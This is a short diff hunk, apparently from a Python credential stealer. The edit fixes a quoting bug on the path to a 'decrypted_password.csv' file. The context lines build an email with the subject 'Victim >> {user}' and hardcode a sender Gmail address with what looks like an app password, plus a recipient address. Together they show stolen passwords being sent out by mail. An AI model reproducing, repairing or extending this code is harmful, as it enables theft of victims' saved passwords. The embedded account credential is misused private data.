@@ -138,7 +138,7 @@ if __name__ == '__main__':
         user = os.getlogin()
         subject = f"Victim >> {user}"
         body = ""
-        path = f'{a}\\decrypted_password.csv"
+        path = f"{a}\\decrypted_password.csv"
         sender_email = 'iamqwertyfish@gmail.com'
         sender_password = 'gdym qzfa ugfd qngz'
         recipient_email = 'sepiolsam2023@gmail.com'
